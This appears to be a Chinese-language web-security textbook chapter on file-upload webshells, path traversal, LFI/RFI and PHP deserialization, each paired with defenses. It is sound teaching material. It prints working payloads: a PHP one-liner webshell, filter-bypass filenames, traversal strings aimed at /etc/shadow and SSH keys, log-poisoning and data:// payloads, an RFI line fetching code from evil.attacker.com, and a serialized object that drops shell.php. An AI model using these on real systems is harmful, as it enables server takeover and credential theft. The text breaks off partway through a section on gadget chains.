# 第 13 章:檔案上傳・路徑穿越・反序列化 —— 三條通往 RCE 的路

> 上一章(第 12 章)談存取控制,教的是「越權讀寫『資料』」——你看到、改到本不該碰的那幾列資料。
> 這一章更狠。我們要越權「寫進檔案系統」、要「讀遍整台主機的檔案」、甚至要讓伺服器把我們送過去的資料
> 「當成程式碼還原執行」。檔案上傳、路徑穿越、反序列化——三個看似不相干的漏洞,其實是三條殊途同歸的路,
> 終點都寫著同一個字:**RCE(Remote Code Execution,遠端程式碼執行,第 00 章術語表裡最嚴重的那一類)**。
> 一旦拿到 RCE,你不再是「在跟網頁互動」,而是「站在伺服器的命令列上」——這一步,危害等級直接封頂。
> 這是 Web 攻防篇(第 2 篇)的收尾章;學完它,我們就要從「打網頁」跨進「打系統」了。所有操作,只在你自己的靶場動手。

---

## 13.1 開場:三條路,同一個終點

前面九章的 Web 漏洞,危害各有天花板:XSS 打的是別人的瀏覽器(第 09 章)、CSRF 借的是你的 cookie(第 10 章)、IDOR 撈的是別人的資料列(第 12 章)。這一章的三個漏洞不一樣——它們的天花板,是**直接拿到伺服器的控制權**。

先把三條路一次攤開,你會發現它們共用同一個病根:

```
① 惡意檔案上傳:把「一個能被伺服器執行的檔案」放進伺服器 → 之後連上去執行它 → RCE
② 路徑穿越/檔案包含:騙伺服器去「讀取 / 引入」一個它本不該碰的檔案 → 讀祕密,或引入到能執行 → RCE
③ 不安全的反序列化:把「一段構造好的位元組流」餵給伺服器還原 → 還原過程觸發程式碼執行 → RCE
```

三者的共同公式,你在第 07 章就背過了:

```
「不可信的資料」 + 「被當成程式碼 / 檔案路徑解讀的地方」 = 漏洞
```

- SQL 注入:輸入被當成 **SQL 語法**(第 07 章)。
- 命令注入:輸入被當成 **shell 指令**(第 08 章)。
- XSS:輸入被當成 **HTML / JS**(第 09 章)。
- **這一章**:輸入被當成 **①可執行的檔案 ②檔案路徑 ③要還原的物件**。

> **心智模型**:資料 vs 程式碼,這條界線是整個 Web 攻防篇的主軸。前面幾章是「資料混進了某個直譯器的語法」;這一章是「資料變成了『檔案』或『物件』,而檔案會被執行、物件會在還原時觸發程式碼」。招式換皮,骨子沒變——**只要不可信的東西能碰到「會執行它的機制」,就是 RCE 的起點**。

RCE 為什麼是最嚴重的一類?回想第 00 章術語表:RCE = 能在目標主機上執行任意程式碼。拿到它,等於拿到一個 **shell**(第 00 章:能下指令了)。接下來就是提權、後滲透、橫向移動(第 16 章)——那已經是系統攻防篇的事了。這一章,就是那扇從 Web 通往系統的門。

## 13.2 惡意檔案上傳:一個 webshell 就接管主機

> **提醒**:上傳 webshell 等於取得系統控制權,這是本課目前為止最「重」的操作。**只能對你自己搭的靶場(第 01 章)或官方授權平台**動手。對沒授權的系統上傳一個木馬,在台灣直接踩爆《刑法》§358 入侵罪與 §359 破壞電磁紀錄罪(第 00 章),而且是鐵證。

幾乎每個網站都有上傳功能:大頭貼、附件、履歷、商品圖。開發者想的是「使用者傳張圖片來」;攻擊者想的是「我能不能傳一個**程式**進去,而且讓伺服器**執行**它?」

### 什麼是 webshell

**webshell** 是一個放在網站可存取目錄下的腳本檔(PHP、JSP、ASP…),攻擊者用瀏覽器連上它,就能透過它在伺服器上下指令。最經典的是 PHP「一句話木馬(one-liner)」:

```php
<?php system($_GET['c']); ?>
// system():執行一條作業系統指令,並把輸出印回頁面
// $_GET['c']:從網址的 c 參數拿指令內容 —— 完全由攻擊者控制
```

假設攻擊者成功把它存成伺服器上的 `/uploads/shell.php`,接著:

```
http://靶機/uploads/shell.php?c=id
--                            ↑ c 參數帶入要執行的指令
```

伺服器收到請求 → PHP 直譯器執行 `shell.php` → `system('id')` 跑起來 → 頁面回顯 `uid=33(www-data) gid=33(www-data)`。**攻擊者現在能透過這個網址下任何指令**:`?c=cat /etc/passwd`、`?c=ls -la /`、`?c=whoami`……接著上傳更完整的互動式 shell、反向連線回攻擊機(第 14 章),就從「一個網頁」變成「一台被控制的主機」。

### 為什麼會中:兩個條件缺一不可

檔案上傳要能升級成 RCE,得同時滿足:

```
條件一:攻擊者能把「檔案內容」與「檔名/副檔名」控制成一個可執行腳本
條件二:那個檔案被存到「伺服器會拿直譯器去跑它」的目錄
        (例如 web 根目錄下、且該目錄允許執行 .php)
```

完整攻擊鏈畫出來:

```
攻擊者上傳 shell.php  ──①繞過前端/後端的過濾檢查──▶  存進 /var/www/html/uploads/shell.php
                                                              │
瀏覽器連 /uploads/shell.php?c=whoami  ──②目錄允許執行 PHP──▶  直譯器執行 → 回傳指令輸出
                                                              │
                                                              ▼
                                                        RCE:站上伺服器命令列
```

> **心智模型**:上傳功能的本質,是「**讓外部的人往你的檔案系統寫東西**」——這是一個天生高風險的信任邊界(第 00 章)。問題從來不是「使用者傳了什麼」,而是「你把它**存去哪、之後拿它做什麼**」。同一個 `shell.php`,存進不會被執行的物件儲存桶就是一串死掉的文字;存進 `www` 目錄就是一把接管主機的鑰匙。**危害不在檔案本身,在它的落點。**

新手常見的誤區:「我在前端用 JavaScript 檢查了副檔名只能是 `.jpg`,應該安全吧?」——第 00 章講到爛的那句話:**所有前端驗證對攻擊者都無效**。攻擊者根本不透過你的網頁,直接用 Burp(第 06 章)改一個上傳請求,前端那段 JS 形同不存在。真正的檢查一定在後端,而且如下一節所示,後端也很容易寫錯。

## 13.3 上傳過濾繞過:黑名單為什麼(又)必敗

開發者的第一直覺通常是黑名單:「把 `.php` 擋掉不就好了?」——第 09 章我們才剛用 XSS 證明過黑名單思維的下場,這裡歷史重演。可執行副檔名、偽裝手法多到列不完,黑名單永遠有漏網之魚。看攻擊者的武器庫。

### 一、副檔名黑名單繞過

只擋 `.php`?PHP 在很多設定下還會執行一票**別的副檔名**:

```
shell.php5      shell.phtml     shell.pht      shell.phar
shell.php3      shell.php4      shell.php7     shell.inc
```

再加上**大小寫**:很多檢查只比對小寫 `.php`,但檔案系統與伺服器對副檔名常常不分大小寫:

```
shell.PHP       shell.PhP       shell.pHp
```

一個「只擋小寫 `.php`」的黑名單,`shell.PHP` 就過了,而 Apache 照樣把它當 PHP 執行。

### 二、雙重副檔名(double extension)

利用伺服器設定的漏洞。經典的 Apache 錯誤設定會「從右往左找到第一個認得的副檔名」就決定怎麼處理:

```
shell.php.jpg
--   ↑    ↑ 開發者的檢查看到結尾是 .jpg → 放行(以為是圖片)
--        └ 但設定不當的 Apache 看到中間有 .php → 當 PHP 執行!
```

一個檔名同時「騙過看結尾的檢查」又「命中伺服器的執行規則」,兩頭通吃。

### 三、Content-Type 竄改

有些後端只看 HTTP 請求裡宣告的 `Content-Type`。這個值是**客戶端自己填的**,用 Burp 一改就過:

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=x

--x
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg          ← 檔案是 PHP,卻謊報成 image/jpeg,騙過只看這行的後端
                                    (第 00 章:凡是使用者送的,都可竄改)

<?php system($_GET['c']); ?>
--x--
```

### 四、魔術位元組(magic bytes)偽裝

進階一點的後端會「讀檔案開頭幾個位元組」判斷真實型別——每種檔案格式開頭都有固定的「檔案簽章(file signature / magic bytes)」,例如 PNG 是 `89 50 4E 47`、JPEG 是 `FF D8 FF`、GIF 是 `47 49 46 38`(即 `GIF8`)。攻擊者就在 PHP 前面**貼一段假的魔術位元組**:

```php
GIF89a
<?php system($_GET['c']); ?>
// 開頭 GIF89a 讓「檢查 magic bytes」的後端相信這是一張 GIF 圖
// 但 PHP 直譯器只在乎 <?php ... ?>,其餘當雜訊忽略 → 照樣執行
```

### 五、`.htaccess` 與圖片馬(polyglot)

如果連內容都擋不住,攻擊者換個思路:

- **`.htaccess` 攻擊**:Apache 的目錄設定檔。若允許上傳 `.htaccess`,攻擊者上傳一個內容為 `AddType application/x-httpd-php .jpg` 的 `.htaccess`,就等於下令「**把這個目錄裡的 `.jpg` 都當 PHP 執行**」——之後傳一張夾帶 PHP 的 `.jpg` 就能跑。等於自己改寫了伺服器規則。
- **圖片馬 / polyglot(多語言檔)**:做出一個「**既是合法圖片、又是合法 PHP**」的檔案。它能通過圖片解析(甚至縮圖都正常),但被當 PHP 引入 / 執行時又會跑裡面的程式碼。常搭配下一節的 LFI 一起用:先把圖片馬傳上去(過了圖片檢查),再用檔案包含漏洞把它「當成 PHP 引入」。

### 六、Null byte(舊環境)

老舊的 PHP(< 5.3.4)與部分 C 底層函式,字串遇到 null byte `%00` 會被截斷:

```
shell.php%00.jpg
--        ↑ 檢查函式看到 .jpg 放行,但底層存檔時字串在 %00 處被截斷 → 實際存成 shell.php
```

這招在現代環境多半失效(已修補),但你會在 CTF 與舊系統遇到,知道原理即可。

### 各手法對照

| 繞過手法 | 針對的錯誤檢查 | 核心原理 |
|----------|---------------|----------|
| 替代副檔名 `.php5`/`.phtml` | 只擋 `.php` 的黑名單 | 伺服器認得的可執行副檔名不只一個 |
| 大小寫 `.PhP` | 只比對小寫 | 檔名/伺服器對副檔名不分大小寫 |
| 雙重副檔名 `shell.php.jpg` | 只看結尾副檔名 | 伺服器設定「從左找到可執行副檔名」就執行 |
| Content-Type 竄改 | 只信任 HTTP 宣告的型別 | 該欄位由客戶端控制,可任意偽造 |
| Magic bytes 偽裝 | 只讀檔頭判斷型別 | 貼假簽章騙過,PHP 只認 `<?php` |
| `.htaccess` / 圖片馬 | 內容/副檔名都擋住時 | 改寫伺服器執行規則,或做圖片+PHP 雙合法檔 |
| Null byte `%00` | 舊版字串處理 | 底層字串被 `%00` 截斷 |

> **為什麼黑名單註定失敗(第三次強調)**:攻擊者的變化空間 = 副檔名 × 大小寫 × 雙重副檔名 × Content-Type × magic bytes × 伺服器設定,近乎無限;黑名單是「列舉壞東西」,你永遠列不完。這和第 07 章的 SQLi、第 09 章的 XSS 是同一個教訓——**防禦不能靠猜『哪些是壞的』,要靠白名單正面表列『只允許哪些』,再從架構上讓上傳的東西根本無法被執行。** 這正是下一節。

## 13.4 【防禦】檔案上傳:白名單 + 內容驗證 + 讓它無法執行

防禦要寫得跟攻擊一樣詳盡。檔案上傳的防禦是**縱深防禦**(第 00 章):把好幾層獨立的防線疊起來,任何一層都不假設「前一層一定擋得住」。核心六層:

### ① 白名單副檔名 + 驗證「真實內容」

不要問「哪些副檔名該擋」,要問「**我只接受哪些**」——正面表列(allowlist):

```php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];          // 只允許這幾種,其餘一律拒絕
$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));  // 取副檔名並轉小寫(堵大小寫繞過)
if (!in_array($ext, $allowed, true)) {
    die('不支援的檔案類型');                          // 不在白名單 → 直接擋
}
```

但**只看副檔名不夠**(magic bytes 偽裝那招還在)。要進一步驗證檔案的**真實內容**——用會實際解析檔案的函式,而不是信任副檔名或 Content-Type:

```php
// 用 getimagesize() 真的去「解析成圖片」,解析不出來就不是有效圖片
$info = @getimagesize($tmp_path);
if ($info === false) {
    die('這不是一張有效的圖片');
}
// 進階:finfo 讀真實 MIME,再跟白名單比對
$mime = (new finfo(FILEINFO_MIME_TYPE))->file($tmp_path);
if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'], true)) {
    die('MIME 型別不符');
}
```

> **關鍵認知**:注意這裡驗的是「伺服器端**實際解析**出來的型別」,不是「客戶端宣稱的 Content-Type」。前者你可以信,後者是使用者送的、可任意偽造(13.3 第三招)。

### ② 重新命名,絕不信任原始檔名

原始檔名整個都不可信——副檔名、路徑、字元全部都可能是攻擊。正確做法:**自己產一個亂數檔名**,副檔名用你「驗證後認定」的那個,原檔名頂多存進資料庫當顯示用:

```php
$safe_name = bin2hex(random_bytes(16)) . '.jpg';   // 亂數檔名 + 你驗證過的固定副檔名
// 攻擊者的 shell.php.jpg、shell.php%00.jpg、../../etc 全部失去意義
// 因為最終落地的檔名完全由你決定,跟他送的原檔名無關
```

這一招同時順手擋掉「上傳時的路徑穿越」(檔名裡塞 `../` 想把檔案寫到別處,見 13.5)。

### ③ 存到 web 根目錄外,或不可執行的儲存

這是**最強的一層,因為它直接拔掉 13.2 的「條件二」**:就算攻擊者真的傳了個 webshell 進來,只要那個位置**根本不會被拿去執行**,它就只是一坨死檔案。

- **存到 web 根目錄(document root)之外**,要下載時由程式讀出來回傳,而不是讓瀏覽器直接用網址命中檔案。
- **更推薦:存進物件儲存**(如 S3 / GCS / 私有儲存服務)。物件儲存只會把檔案「當靜態內容吐給你」,**沒有 PHP / JSP 直譯器**,`shell.php` 丟進去也只會被當純文字下載,永遠跑不起來。這是現代架構最省心的解法。

### ④ 關閉上傳目錄的執行權限

如果檔案非得放在 web 目錄下,就從**伺服器設定**明令「這個目錄不准執行任何腳本」。這是給前幾層加的保險。以 Nginx 為例(可搭配本倉庫 Nginx 課程 `../nginx/README.md`):

```nginx
location ^~ /uploads/ {
    # 這個目錄下的所有請求,一律當靜態檔案回傳,絕不交給 PHP 處理
    default_type application/octet-stream;   # 一律當二進位下載,不當網頁渲染
    location ~ \.php$ { deny all; }          # 明確拒絕存取 .php(雙保險)
}
```

Apache 則在該目錄放 `.htaccess`(前提是你自己控制、且禁止使用者覆蓋它):

```apache
# 關閉這個目錄的 PHP 引擎
php_admin_flag engine off
RemoveHandler .php .phtml .php5 .phar
```

> **心智模型**:③④ 兩層在做同一件事——**斬斷 13.2 的攻擊鏈第二環**。第 00 章講 Kill Chain 說過,你不需要擋住每一環,打斷任一環整條鏈就斷了。上傳過濾(①②)是擋「檔案進不進得來」;不可執行儲存(③④)是擋「進來了也跑不起來」。**後者更可靠**,因為它不依賴「你有沒有把過濾寫對」——就算過濾被繞過,webshell 也無處可執行。

### ⑤ 圖片重新編碼(打掉 polyglot / 圖片馬)

對圖片這種「本來就要顯示」的檔案,最狠的一招是:**收到後用影像函式庫重新編碼再存**。重新編碼會把圖片「重畫」一遍,只保留純影像資料,夾在裡面的 PHP 程式碼、假 metadata、polyglot 結構全部被丟掉:

```php
$img = imagecreatefromjpeg($tmp_path);   // 解碼成純點陣圖(夾帶的 PHP 在此被丟棄)
imagejpeg($img, $final_path, 90);         // 重新編碼輸出乾淨的 JPEG
imagedestroy($img);
```

### ⑥ 限制大小、掃毒、記錄

- **限制檔案大小 / 尺寸**:擋掉塞爆磁碟的 DoS(第 00 章:干擾也是攻擊)。
- **防毒 / 惡意檔案掃描**(如 ClamAV):攔常見惡意樣本,尤其是給人「下載」的檔案。
- **記錄上傳事件**(誰、何時、傳了什麼)——出事時的追查依據(第 20、21 章)。

**六層總覽(縱深防禦)**:

| 層 | 手段 | 定位 |
|----|------|------|
| 入口 | 白名單副檔名 + 驗真實內容/MIME | 擋掉大部分惡意檔進來 |
| 入口 | 重新命名(不信任原檔名) | 消滅雙重副檔名/null byte/路徑穿越 |
| **架構** | **存 web 根目錄外 / 物件儲存** | **根治:讓 webshell 無處可執行** |
| 架構 | 關閉上傳目錄執行權限 | 雙保險,斬斷執行環節 |
| 內容 | 圖片重新編碼 | 打掉 polyglot / 圖片馬 |
| 輔助 | 限大小 / 掃毒 / 記錄 | 縮小攻擊面、可追查 |

## 13.5 路徑穿越:一個 `../` 讀遍全機

第二條路。很多網站會「依使用者給的名字去讀一個檔案」——下載附件、載入語系檔、顯示圖片、讀模板。看這個常見(且危險)的寫法:

```php
<?php
// download.php —— 依 file 參數回傳一個檔案
$file = $_GET['file'];                       // ① 使用者可控的檔名(不可信!)
readfile("/var/www/files/" . $file);         // ② 直接接在固定目錄後面就去讀
?>
```

開發者的假設:「使用者只會傳 `report.pdf` 這種檔名。」正常請求 `download.php?file=report.pdf`,讀的是 `/var/www/files/report.pdf`,沒問題。

問題出在**第 ② 行把使用者輸入直接接進路徑**,而路徑裡有個威力驚人的東西:`..`(上一層目錄)。攻擊者傳:

```
download.php?file=../../../../etc/passwd
```

拼出來的路徑:

```
/var/www/files/../../../../etc/passwd
--             ↑ 每個 ../ 往上跳一層,跳夠多次就跳到根目錄 /
--             作業系統正規化後 = /etc/passwd
```

於是 `readfile()` 讀的是 `/etc/passwd`——伺服器上的系統帳號檔,直接回顯到頁面。這就是**路徑穿越(Path / Directory Traversal)**,也叫 `../` 攻擊或 dot-dot-slash 攻擊。多墊幾個 `../` 是為了確保無論起始目錄多深,都能爬到根目錄。

### 能讀到什麼

拿到任意讀檔能力,攻擊者的購物清單很長:

```
/etc/passwd                         系統使用者清單(Linux 的 hello world 目標)
/etc/shadow                         密碼雜湊(若權限夠 → 拿去離線破解,第 15 章)
/var/www/html/config.php            應用設定檔:資料庫帳密、API 金鑰、加密 secret!
~/.ssh/id_rsa                       SSH 私鑰 → 可能直接登入主機
/proc/self/environ                  行程環境變數(有時含機敏資訊)
C:\Windows\win.ini                  Windows 靶機的常見驗證目標
```

讀到設定檔裡的 DB 帳密、JWT secret(第 11 章)、雲端金鑰,往往就串成下一步的漏洞鏈(第 00 章)——路徑穿越常常不是終點,是跳板。

### 編碼繞過:又見黑名單

開發者若用黑名單擋 `../`,一樣有一堆繞法(是不是很熟悉?):

```
%2e%2e%2f              → URL 編碼的 ../(. = %2e,/ = %2f);伺服器解碼後還原成 ../
..%2f  或  %2e%2e/     → 半編碼混搭
....//                 → 若過濾器把 "../" 整段刪一次,....// 刪掉中間的 ../ 剩下 ../
..%252f                → 雙重 URL 編碼(%25 = %),過一層 WAF 解碼後才變 %2f
..%c0%af               → 舊系統的 overlong UTF-8 編碼繞過
```

`....//` 這招和第 09 章 XSS 的 `<scr<script>ipt>` 是完全一樣的陰招:一個「把 `../` 刪掉就好」的過濾器,反而幫攻擊者把 payload 拼回完整的 `../`。

> **心智模型**:路徑穿越 = 「**掙脫牢籠(directory)**」。開發者以為把使用者關在 `/var/www/files/` 這個籠子裡,但 `../` 是籠子的鑰匙——它讓相對路徑一路往上爬,爬出籠子,遊走整個檔案系統。防禦的核心因此很明確:**別讓使用者輸入直接變成路徑;就算要用,也要在解析成絕對路徑後,確認它還關在籠子裡**(13.7)。

## 13.6 檔案包含 LFI / RFI:從「讀檔」升級成 RCE

路徑穿越讓你「讀」檔案。如果那個檔案不是被「讀出來顯示」,而是被程式當成「**要引入執行的程式碼**」——危害就從洩密升級成 RCE。這就是**檔案包含(File Inclusion)**,PHP 是重災區。

PHP 的 `include` / `require` 會把目標檔案**當成 PHP 程式碼引入並執行**。很多老程式用它做頁面路由:

```php
<?php
// index.php?page=home  →  引入 home.php 當頁面內容
$page = $_GET['page'];        // ① 使用者可控
include($page . ".php");      // ② 直接拿去 include —— 災難
?>
```

### LFI(Local File Inclusion,本地檔案包含)

攻擊者讓 `include` 去引入**伺服器上已存在的檔案**。配合路徑穿越:

```
index.php?page=../../../../etc/passwd%00
--                                     ↑ 舊版用 %00 截斷尾巴的 .php
```

單純引入 `/etc/passwd` 只是把內容當 PHP 跑(沒有 `<?php` 就當純文字印出),看起來只是洩密。但 LFI 真正可怕的是它有好幾條**升級成 RCE** 的路——只要能讓 `include` 引入到「一個含有攻擊者 PHP 程式碼的檔案」:

**① Log poisoning(日誌投毒)**——最經典。伺服器會把請求記進 log(如 Apache 的 `access.log`),而 log 會記下你的 `User-Agent`。攻擊者故意把 `User-Agent` 設成 PHP 程式碼:

```http
GET / HTTP/1.1
User-Agent: <?php system($_GET['c']); ?>      ← 這段被寫進 access.log
```

然後用 LFI 去 `include` 那個 log 檔:

```
index.php?page=../../../../var/log/apache2/access.log
--  include 把 log 檔當 PHP 引入 → 裡面那段 <?php system($_GET['c']) ?> 被執行 → RCE
```

**② PHP filter 包裝器**:`php://filter` 可以在引入前對檔案做轉換,最常用來把**原始碼 base64 讀出來**(讀到別人不想給你看的 `config.php` 原始碼):

```
index.php?page=php://filter/convert.base64-encode/resource=config.php
--  把 config.php 內容 base64 編碼後吐出來(避免被當 PHP 執行掉),解碼即得原始碼含帳密
```

**③ data 包裝器**:`data://` 讓你「直接把要執行的 PHP 內容寫在 URL 裡」——不需要先落地任何檔案:

```
index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
--  base64 那段解碼後就是 <?php system($_GET['c']);?>,include 直接執行 → RCE
--  (需要伺服器開了 allow_url_include,見下)
```

**④ 搭配圖片馬**:13.3 傳上去的圖片馬(合法圖片 + 夾帶 PHP),用 LFI `include` 它 → 裡面的 PHP 被執行。這就是為什麼 13.4 要「圖片重新編碼」。

### RFI(Remote File Inclusion,遠端檔案包含)

比 LFI 更直接:如果 PHP 設定開了 `allow_url_include`,`include` 甚至能引入**遠端網址**的檔案:

```
index.php?page=http://evil.attacker.com/shell.txt
--  伺服器主動去攻擊者的機器抓 shell.txt,當成 PHP 引入執行 → 直接 RCE
```

攻擊者把 webshell 放在自己的伺服器上,一行網址就讓靶機去抓來執行,連上傳都省了。RFI 之所以現在較少見,正是因為 `allow_url_include` 現代預設為 **Off**(這本身就是一種防禦,見下節)。

> **心智模型**:LFI/RFI = 「**把資料當程式碼引入**」的極致。路徑穿越是「讀」(頂多洩密),檔案包含是「執行」(直達 RCE);差別只在那個被指向的檔案,最後是進了 `readfile()`(當內容)還是進了 `include()`(當程式碼)。同一條 `../` payload,落在不同函式,危害天差地遠——這再次呼應第 07 章的核心:**資料一旦碰到「會執行它的機制」,就不再只是資料。**

## 13.7 【防禦】路徑穿越與檔案包含:別讓輸入變成路徑

這兩者根治的心法一致:**使用者輸入永遠不該直接、或間接地決定一個檔案路徑**。做不到完全避免時,就用下面幾層把籠子焊死。

### ① 最佳解:根本不用使用者輸入拼路徑,改用固定對照表

大多數「依參數載入檔案」的需求,其實可以換成「白名單對照」——使用者只送一個**代號**,由伺服器查表換成真正的路徑。這樣使用者的輸入**永遠碰不到路徑本身**:

```php
// 白名單對照表:使用者只能送 key,真正的檔名由伺服器決定
$pages = [
    'home'    => 'home.php',
    'about'   => 'about.php',
    'contact' => 'contact.php',
];
$key = $_GET['page'];
if (!isset($pages[$key])) {
    die('頁面不存在');            // 不在白名單 → 擋。攻擊者送 ../ 或任何東西都無效
}
include(__DIR__ . '/pages/' . $pages[$key]);
```

這是最乾淨的做法——**攻擊者能控制的只是一個 key,而 key 不在表裡就直接被拒**,`../`、`php://`、`http://` 全都失去意義。

### ② 非用檔名不可時:正規化後驗證「仍在允許目錄內」

有些場景(如使用者上傳檔案的下載)無法完全用對照表。這時的鐵律是:**先把路徑解析成絕對路徑(canonicalize),再確認它確實還在你允許的目錄底下**。關鍵是「先正規化再檢查」——因為 `../` 會在正規化時被消解,你要驗的是「消解之後」的結果:

```php
$base = '/var/www/files/';                          // 允許的籠子(base directory)
$requested = realpath($base . $_GET['file']);       // realpath():解析 ../、符號連結,得到真正的絕對路徑

// 核心檢查:解析後的絕對路徑,開頭必須仍是 $base
if ($requested === false || strncmp($requested, realpath($base), strlen(realpath($base))) !== 0) {
    die('非法路徑');    // 只要 ../ 讓它爬出了籠子,開頭就不再是 $base → 擋下
}
readfile($requested);
```

搭配 `basename()` 把路徑資訊整個剝掉、只留檔名,更省事:

```php
$file = basename($_GET['file']);   // basename("../../etc/passwd") → "passwd",所有 ../ 被扔掉
```

> **新手誤區**:「我把 `../` 用字串取代刪掉不就好了?」——這就是黑名單,13.5 的 `....//`、`%2e%2e`、雙重編碼會輪流打你的臉。**正確思路是正規化 + 白名單邊界檢查**(問「解析後還在不在籠子裡」),而不是「猜哪些字元是壞的」。這和第 07/09 章的結論一模一樣:正向表列 > 反向黑名單。

### ③ 關閉遠端包含,鎖死可包含範圍

針對 PHP 檔案包含的設定層防禦:

```ini
; php.ini
allow_url_include = Off      ; 關掉「include 遠端網址」→ RFI 直接絕種(現代預設值)
allow_url_fopen  = Off       ; 連 fopen 遠端也關(用不到就關,縮小攻擊面)
open_basedir = /var/www/html ; 把 PHP 能存取的檔案「關進這個目錄樹」,LFI 也爬不出去
```

`open_basedir` 尤其關鍵——它是 PHP 層級的「籠子」,就算程式碼有 LFI,PHP 也拒絕存取這個目錄樹以外的檔案(讀不到 `/etc/passwd`)。這是給程式碼漏洞加的架構級保險。

### ④ 最小權限與縱深

- **最小權限**(第 00 章):web 程式跑在低權限帳號(如 `www-data`),讀不到 `/etc/shadow`、別人家目錄的 `.ssh`——即使路徑穿越成功,能撈到的也有限。
- **關閉詳細錯誤**:別讓「檔案不存在」的錯誤把絕對路徑噴給攻擊者當地圖(第 19 章)。

| 防線 | 手段 | 效果 |
|------|------|------|
| **最佳** | 固定對照表(使用者只給 key) | 輸入碰不到路徑,根治 |
| 次佳 | realpath 正規化 + base 目錄檢查 | 確認沒爬出籠子 |
| 化簡 | basename() 只取檔名 | 直接剝掉所有 `../` |
| 設定 | allow_url_include=Off / open_basedir | 絕種 RFI、鎖死 LFI 範圍 |
| 架構 | 最小權限帳號 + 關詳細錯誤 | 縮小可讀範圍、不給地圖 |

## 13.8 反序列化是什麼:物件與位元組流的往返

第三條路,也是三者裡最「反直覺」的一個。要看懂它,得先花一分鐘搞懂序列化。

### 序列化 / 反序列化

程式在記憶體裡處理的是「**物件(object)**」——有屬性、有方法的結構化資料。但物件沒辦法直接存進檔案、塞進 cookie、透過網路傳送(那些通道只認得「一串位元組 / 字串」)。於是需要一個往返轉換:

```
序列化(Serialize)     :物件  ──轉成──▶  一串可儲存/傳輸的位元組流(字串)
反序列化(Deserialize) :位元組流  ──還原──▶  記憶體裡的物件

用途:存 session、寫快取、cookie 存狀態、API 傳物件、訊息佇列、RPC……無處不在
```

舉個 PHP 的例子。有這麼一個物件:

```php
class User {
    public $name = "alice";
    public $isAdmin = false;
}
$s = serialize(new User());
// $s 的內容是這個字串:
// O:4:"User":2:{s:4:"name";s:5:"alice";s:7:"isAdmin";b:0;}
```

拆解這串序列化資料的格式(看懂它,才懂攻擊者怎麼構造):

```
O:4:"User"          → Object,類別名長度 4,類別名 "User"
:2:                 → 這個物件有 2 個屬性
{s:4:"name";        → 屬性名:string 長度 4 = "name"
 s:5:"alice";       → 屬性值:string 長度 5 = "alice"
 s:7:"isAdmin";     → 屬性名:string 長度 7 = "isAdmin"
 b:0;}              → 屬性值:boolean = 0(false)
```

`unserialize($s)` 就能把這串字串**還原回一個 `User` 物件**。到這裡都很正常、很有用。**問題出在:如果這串字串是攻擊者送的呢?**

### 本質:又是「資料被當成程式碼」

如果一個網站把序列化字串放在**使用者能碰到的地方**(cookie、隱藏欄位、API 參數),攻擊者就能**竄改甚至完全自己構造**這串字串,再送回去給伺服器 `unserialize()`。最直白的一種攻擊:把上面的 `isAdmin;b:0`(false)改成 `isAdmin;b:1`(true),送回去——伺服器還原出一個 `isAdmin = true` 的物件,你就變管理員了(這其實也是一種存取控制繞過,呼應第 12 章)。

但反序列化的真正殺傷力遠不止「改個屬性值」。它能直達 RCE,原因在下一節——**還原物件的過程本身,會觸發程式碼執行**。

> **心智模型**:序列化字串看起來是「資料」(一串字元),但 `unserialize()` 會照著它「**重建一個物件**」——而「重建物件」在很多語言裡是個**會執行程式碼的動作**(呼叫建構 / 解構相關的魔術方法)。所以這串「資料」其實間接控制了「程式做什麼」。這就是它和第 07 章 SQLi 同源之處:**不可信的資料,流進了一個會把它當成『行為指令』來解讀的機制。**

---

## 13.9 不安全的反序列化:為什麼「還原資料」會執行程式碼

先講清楚一個關鍵事實,很多人卡在這:「不就是把字串變回物件嗎,怎麼會執行到程式碼?」答案是**魔術方法(magic methods)**。

### 魔術方法:物件生命週期的自動觸發點

很多語言的類別有一些「在特定時機被**自動**呼叫」的方法,不需要你主動去 call。PHP 的例子:

- `__wakeup()`:物件被 **`unserialize()` 還原時**自動呼叫。
- `__destruct()`:物件被**銷毀時**(如腳本結束)自動呼叫。
- `__toString()`:物件被**當字串使用時**自動呼叫。

危險就在:`unserialize()` 會建立物件,而建立 / 銷毀物件會自動觸發這些方法。**如果某個類別的魔術方法裡剛好有「危險操作」,而攻擊者又能控制物件的屬性值,他就能操控那個危險操作。** 看一個簡化(但足以說明本質)的例子:

```php
<?php
class Logger {
    public $logfile;                          // 要寫入的檔名
    public $data;                             // 要寫入的內容
    public function __destruct() {            // ← 物件被銷毀時,PHP 自動呼叫這個
        // 開發者原意:把 data 記進 log 檔。看起來人畜無害
        file_put_contents($this->logfile, $this->data);
    }
}

// 網站某處把使用者送的字串直接還原:
$obj = unserialize($_COOKIE['data']);         // ① 反序列化不可信資料 —— 致命
// 腳本結束,$obj 被銷毀 → __destruct() 自動執行 → file_put_contents(...)
?>
```

開發者從沒打算讓使用者控制寫檔——但攻擊者**自己構造**一個 `Logger` 物件的序列化字串,把兩個屬性設成他要的值:

```
O:6:"Logger":2:{s:7:"logfile";s:9:"shell.php";s:4:"data";s:26:"<?php system($_GET[c]);?>";}
--            ↑ logfile = "shell.php"        ↑ data = 一句話木馬
```

把它塞進 `data` cookie 送出。伺服器 `unserialize()` 還原出這個 `Logger` 物件,腳本結束時 `__destruct()` 自動觸發,執行 `file_put_contents('shell.php', '<?php system($_GET[c]);?>')`——**在伺服器上寫出了一個 webshell**(繞了一大圈,又回到 13.2 的 RCE)。攻擊者從頭到尾沒登入、沒上傳,只送了一個 cookie。

> **關鍵認知**:攻擊者**不需要**在字串裡塞「執行指令的程式碼」。他只是**選了一個現成的類別、填了幾個屬性值**,借用那個類別的魔術方法(`__destruct` 裡的 `file_put_contents`)去做壞事。程式碼是**你自己專案裡就有的**——攻擊者只是決定「用什麼屬性去餵它」。這就是反序列化攻擊最反直覺、也最危險的地方。

### gadget chain:把現成類別的方法串成一條路

真實專案裡,`__destruct` 剛好直接寫檔的類別不常見。但攻擊者有更強的玩法——**gadget chain(利用鏈,又稱 POP chain,Property-Oriented Programming)**:

```
真實世界的反序列化利用長這樣:
  類別 A 的 __wakeup / __destruct  →  裡面呼叫了 $this->handler->close()
       ↓ 攻擊者把 handler 屬性設成「類別 B 的物件」
  類別 B 的 close()               →  裡面又呼叫了 $this->callback(...)
